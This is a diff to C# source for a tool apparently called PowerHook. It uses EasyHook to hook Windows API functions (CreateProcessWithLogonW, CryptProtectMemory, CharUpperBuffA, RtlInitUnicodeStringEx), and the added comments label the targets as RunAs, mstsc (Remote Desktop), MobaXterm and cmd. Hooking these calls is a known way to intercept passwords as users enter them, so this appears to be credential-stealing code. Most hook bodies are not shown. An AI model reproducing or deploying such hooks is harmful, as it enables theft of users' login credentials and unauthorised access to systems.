@@ -115,25 +115,29 @@ namespace PowerHook
             _server.IsInstalled(EasyHook.RemoteHooking.GetCurrentProcessId());
             
             //Install hooks
+
+                // RunAs hook function
                 LoadLibrary("Advapi32.dll");
                 var CreateProcessWithLogonW = EasyHook.LocalHook.Create(
                 EasyHook.LocalHook.GetProcAddress("Advapi32.dll", "CreateProcessWithLogonW"),
                 new CreateProcessWithLogonW_Delegate(CreateProcessWithLogonW_Hook),
                 this);
 
-
+                // mstsc hook function (CredUnPackAuthenticationBufferW didnt work need to check, is better then this function)
                 LoadLibrary("dpapi.dll");
                 var createCryptHook = EasyHook.LocalHook.Create(
                 EasyHook.LocalHook.GetProcAddress("dpapi.dll", "CryptProtectMemory"),
                 new CryptProtectMemory_Delegate(CryptProtectMemory_Hook),
                 this);
-
+                
+                //MobaXterm hook function
                 LoadLibrary("user32.dll");
                 var CreateCharUpperBuffA = EasyHook.LocalHook.Create(
                 EasyHook.LocalHook.GetProcAddress("user32.dll", "CharUpperBuffA"),
                 new CharUpperBuffA_Delegate(CharUpperBuffA_Hook),
                 this);
 
+                //cmd hook function
                 LoadLibrary("ntdll.dll");
                 var CreateRtlInitUnicodeStringEx = EasyHook.LocalHook.Create(
                 EasyHook.LocalHook.GetProcAddress("ntdll.dll", "RtlInitUnicodeStringEx"),
@@ -201,6 +205,8 @@ namespace PowerHook
             EasyHook.LocalHook.Release();
         }
 
+
+        //CMD
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
         delegate bool RtlInitUnicodeStringEx_Delegate(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] String SourceString);
 
@@ -236,7 +242,7 @@ namespace PowerHook
         }
 
 
-
+        //MobaXterm
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi, SetLastError = true)]
         delegate bool CharUpperBuffA_Delegate(string lpsz, UInt32 cchLength);
         [DllImport("user32.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Ansi)]
@@ -284,6 +290,7 @@ namespace PowerHook
         }
 
 
+        //MSTSC
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi, SetLastError = true)]
         delegate bool CryptProtectMemory_Delegate(IntPtr pData, uint cbData, uint dwFlags);
         [DllImport("dpapi.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Ansi)]
@@ -323,8 +330,8 @@ namespace PowerHook
             return CryptProtectMemory(pData, cbData, dwFlags);
         }
 
-
-            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
+        //RUNAS
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
         delegate bool CreateProcessWithLogonW_Delegate(String userName,
            String domain,
            String password,
